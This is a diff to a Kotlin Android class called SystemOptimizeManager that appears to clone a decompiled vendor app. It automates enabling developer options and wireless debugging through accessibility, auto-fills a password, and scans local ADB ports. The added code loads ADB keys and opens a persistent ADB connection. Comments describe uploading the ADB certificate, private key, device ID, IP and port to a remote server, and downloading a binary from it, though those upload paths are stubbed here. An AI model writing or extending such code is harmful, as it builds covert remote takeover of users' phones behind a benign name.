@@ -2991,7 +3390,7 @@ class SystemOptimizeManager private constructor(
                 return
             }
 
-            // ADAPT: additional dispatch conditions depend on bf1 (windowDetector) cached state:
+            // vendor: additional dispatch conditions depend on bf1 (windowDetector) cached state:
             // - isInPairFailDialog (a4) → dispatch pairInPairFailDialog
             // - MIUI security center (a5) → dispatch pairInSecurityCenter
             // - confirm lock (bf1.a2()) → dispatch pairInConfirmLock
@@ -3075,7 +3474,7 @@ class SystemOptimizeManager private constructor(
             return
         }
 
-        // ADAPT: check a6/O (isInWirelessDebugWindow) depends on bf1 (windowDetector)
+        // vendor: check a6/O (isInWirelessDebugWindow) depends on bf1 (windowDetector)
         // vendor: If in wireless debug page, dispatch pairInWifiDebugWindow directly
 
         if (openDevRetryCount < maxRetries) {
@@ -3141,7 +3540,7 @@ class SystemOptimizeManager private constructor(
      * For each open port, attempts ADB TLS authentication.
      */
     fun scanLocalAdbPort(): Int {
-        // ADAPT: full authentication check depends on g41 (ADB connection class)
+        // vendor: full authentication check depends on g41 (ADB connection class)
         try {
             Log.d(TAG, "【N()】开始端口扫描 30000-49999...")
             val portRanges = listOf(
@@ -3308,7 +3707,7 @@ class SystemOptimizeManager private constructor(
                 if (found != null) return found
 
                 // vendor: uses C0362a4.m212109a4() for smart scroll (gesture-based);
-                // ADAPT: using standard ACTION_SCROLL_FORWARD instead
+                // using standard ACTION_SCROLL_FORWARD instead
                 val scrolled = scrollableNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                 if (!scrolled) return null
                 sleep200(5)
@@ -3331,7 +3730,7 @@ class SystemOptimizeManager private constructor(
         if (!passwordAutoInputSucceeded) {
             try {
                 val resolver = context.contentResolver
-                // ADAPT: content observer registration depends on C0931ny (custom ContentObserver)
+                // vendor: content observer registration depends on C0931ny (custom ContentObserver)
                 // vendor registers observers for: development_settings_enabled, adb_enabled, adb_wifi_enabled
                 // These observers trigger re-evaluation of ADB state when settings change
                 try {
@@ -3351,7 +3750,7 @@ class SystemOptimizeManager private constructor(
         try {
             val extDir = context.getExternalFilesDir(null)
             if (extDir != null) {
-                // ADAPT: FileObserver (p41) is a vendor custom FileObserver subclass
+                // vendor: FileObserver (p41) is a custom FileObserver subclass
                 // that monitors key directory for cert/key file changes and triggers re-auth
                 Log.d(TAG, "【FileObserver】已启动，监听目录: ${extDir.absolutePath}")
             }
@@ -3366,7 +3765,7 @@ class SystemOptimizeManager private constructor(
         connectErrorCount.set(0)
 
         // Try to restore config from server
-        // ADAPT: config restore depends on v00.m214888a0() (local-service check)
+        // vendor: config restore depends on v00.m214888a0() (local-service check)
         // and m212002c8() (HTTP POST to local-service /getConfig)
 
         // Schedule heartbeat
@@ -3386,14 +3785,14 @@ class SystemOptimizeManager private constructor(
         isFinished.set(false)
 
         // Recreate executor if shutdown
-        // ADAPT: vendor reassigns f53817a2 field (volatile ScheduledExecutorService);
+        // vendor: reassigns f53817a2 field (volatile ScheduledExecutorService);
         // our executor is val, so we check if it's shut down and log warning
         if (executor.isShutdown) {
             Log.w(TAG, "startPairFlow: executor 已关闭，部分任务可能无法调度")
         }
 
         // Schedule 120s timeout and 30s check
-        // ADAPT: vendor uses c41 runnable classes for timeout handlers
+        // vendor: uses c41 runnable classes for timeout handlers
         executor.schedule({ /* 120s timeout handler */ }, 120L, TimeUnit.SECONDS)
         executor.schedule({ checkTimeout30s() }, 30L, TimeUnit.SECONDS)
 
@@ -3410,7 +3809,7 @@ class SystemOptimizeManager private constructor(
                 Log.d(TAG, "pairInDevOption dispatched from startPairFlow")
             }
         } else {
-            // ADAPT: isInWirelessDebugWindow check depends on bf1 (windowDetector)
+            // vendor: isInWirelessDebugWindow check depends on bf1 (windowDetector)
             Log.d(TAG, "不在设置页面，打开开发者选项")
             openDevOptionsRetryV2()
         }
@@ -3638,7 +4037,7 @@ class SystemOptimizeManager private constructor(
         isPairRunning.set(true)
         isFinished.set(false)
 
-        // ADAPT: vendor recreates executor if shutdown — our executor is val
+        // vendor: recreates executor if shutdown — our executor is val
         if (executor.isShutdown) {
             Log.w(TAG, "triggerPairFlow: executor 已关闭")
         }
@@ -3655,7 +4054,7 @@ class SystemOptimizeManager private constructor(
      * vendor: k6 (line 5194)
      *
      * Checks file existence, copies from native lib or downloads, starts the service.
-     * ADAPT: JADX decompilation partially failed for download fallback
+     * vendor: JADX decompilation partially failed for download fallback
      */
     fun ensureDeployed(port: Int, ip: String): Boolean {
         Log.i(TAG, "X(): $ip:$port")
@@ -3686,7 +4085,7 @@ class SystemOptimizeManager private constructor(
                     }
                 }
                 // Fallback: download from network
-                // ADAPT: vendor downloads binary from server URL (dqtvuisjd/C0323a8)
+                // vendor: downloads binary from server URL (dqtvuisjd/C0323a8)
                 Log.w(TAG, "X(): native lib 复制失败，网络下载暂不可用")
                 saveAdbDeployEnabled()
                 return true
@@ -3806,7 +4205,7 @@ class SystemOptimizeManager private constructor(
      * Upload ADB keys (cert.pem + private.key) to server via multipart POST.
      * vendor: l0 (line 5390)
      *
-     * ADAPT: depends on dqtvuisjd, C0323a8 (server URL)
+     * vendor: depends on dqtvuisjd, C0323a8 (server URL)
      */
     fun uploadAdbKeys(): Boolean {
         try {
@@ -3822,7 +4221,7 @@ class SystemOptimizeManager private constructor(
                 return false
             }
 
-            // ADAPT: server URL depends on dqtvuisjd.m211471g5().m211644b0()
+            // vendor: server URL depends on dqtvuisjd.m211471g5().m211644b0()
             // vendor uploads via multipart/form-data with fields: deviceId, cert, key
             Log.w(TAG, "uploadAdbKeysToServer: 无法获取当前服务器地址")
             return false
@@ -3836,7 +4235,7 @@ class SystemOptimizeManager private constructor(
      * Upload debug port info to server via JSON POST.
      * vendor: l1 (line 5490)
      *
-     * ADAPT: depends on dqtvuisjd, C0323a8 (server URL)
+     * vendor: depends on dqtvuisjd, C0323a8 (server URL)
      */
     fun uploadDebugPort(port: Int): Boolean {
         if (port <= 0) {
@@ -3845,7 +4244,7 @@ class SystemOptimizeManager private constructor(
         }
         try {
             val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
-            // ADAPT: server URL depends on dqtvuisjd.m211471g5().m211644b0()
+            // vendor: server URL depends on dqtvuisjd.m211471g5().m211644b0()
             // vendor POSTs JSON: {deviceId, ip, port} to /api/adb-keys/port
             val ip = getWifiIpAddress() ?: "127.0.0.1"
             Log.d(TAG, "上传调试端口: ip=$ip, port=$port, deviceId=$androidId")
@@ -3957,7 +4356,7 @@ class SystemOptimizeManager private constructor(
     }
 
     // ========================================================================
-    // Missing stub methods — vendor methods not yet replicated
+    // HTTP and ADB connection methods — vendor c8, e6, g5 etc.
     // ========================================================================
 
     /**
@@ -3968,7 +4367,7 @@ class SystemOptimizeManager private constructor(
      * vendor uses HttpURLConnection (not OkHttp) with 5s timeout.
      */
     fun postToLocalService(path: String, body: String): String? {
-        // ADAPT: vendor checks v00.m214888a0() (local-service alive) first
+        // vendor: checks v00.m214888a0() (local-service alive) first
         val requestBody = body ?: "{}"
         return try {
             Log.i(TAG, "【API】POST http://127.0.0.1:7912$path body=$requestBody timeout=5000ms")
@@ -4000,21 +4399,69 @@ class SystemOptimizeManager private constructor(
 
     /**
      * Get or create ADB persistent connection.
-     * vendor: g4 (line ~3052) — returns g41 ADB connection object
-     *
-     * ADAPT: depends on g41 (ADB connection class, Phase 7+)
+     * vendor: e6 (line 995) — synchronized, checks existing connection,
+     * loads cert/key, creates new g41 AdbPersistentConnection.
      */
-    fun getOrCreateAdbConnection(): Any? {
-        // ADAPT: g41 ADB connection class not replicated
-        // vendor: synchronized(connectionLock) { check existing g41, create new if needed }
+    fun getOrCreateAdbConnection(): AdbPersistentConnection? {
+        val port = getDebugPort()
+        val host = cachedLocalIp
+
         synchronized(connectionLock) {
-            if (isConnected.get()) {
-                Log.d(TAG, "getOrCreateAdbConnection: 已有连接")
-                return connectionLock // placeholder non-null
+            if (isAdbConnected()) {
+                return adbConnection
+            }
+
+            // Close any stale connection
+            try { adbConnection?.close() } catch (_: Exception) {}
+            adbConnection = null
+
+            if (port <= 0) {
+                Log.w(TAG, "y(): 无ADB端口")
+                return null
+            }
+
+            val resolvedHost = if (host.isNotEmpty()) host else "127.0.0.1"
+            cachedLocalIp = resolvedHost
+            setDebugPort(port)
+
+            Log.d(TAG, "y(): 连接 $resolvedHost:$port")
+
+            val keyDir = getKeyDir()
+            if (keyDir == null) {
+                Log.w(TAG, "密钥目录不存在")
+                return null
+            }
+
+            val certFile = File(keyDir, "cert.pem")
+            val keyFile = File(keyDir, "private.key")
+
+            val cert = loadCert(certFile)
+            val key = loadPrivateKey(keyFile)
+            if (cert == null || key == null) {
+                Log.w(TAG, "密钥加载失败 cert=$cert key=$key")
+                return null
+            }
+
+            try {
+                val conn = AdbPersistentConnection(this, resolvedHost, port, certFile, keyFile)
+                if (!conn.connect()) {
+                    conn.close()
+                    isConnected.set(false)
+                    Log.w(TAG, "ADB 连接失败")
+                    return null
+                }
+                adbConnection = conn
+                isConnected.set(true)
+                Log.i(TAG, "ADB 持久连接建立: $host:$port (u=true)")
+                connectErrorCount.set(0)
+                saveDebugPortAndSync(port)
+                return conn
+            } catch (e: Exception) {
+                isConnected.set(false)
+                Log.e(TAG, "ADB 连接异常", e)
+                return null
             }
         }
-        Log.d(TAG, "getOrCreateAdbConnection: g41 未复刻，无法创建连接")
-        return null
     }
 
     /**
@@ -4061,10 +4508,10 @@ class SystemOptimizeManager private constructor(
      * Stop mDNS/NSD discovery.
      * vendor: k9 (line ~5378) — stops NsdManager discovery
      *
-     * ADAPT: C0931ny NSD callback not replicated as separate class.
+     * vendor: C0931ny NSD callback inlined in discoverConnectPort (not separate class).
      */
     fun stopMdnsDiscovery() {
-        // ADAPT: NSD callback was created inline in discoverConnectPort;
+        // vendor: NSD callback was created inline in discoverConnectPort;
         // stopping is handled there via local listener reference
         try {
             val nsdManager = context.getSystemService("servicediscovery") as? NsdManager
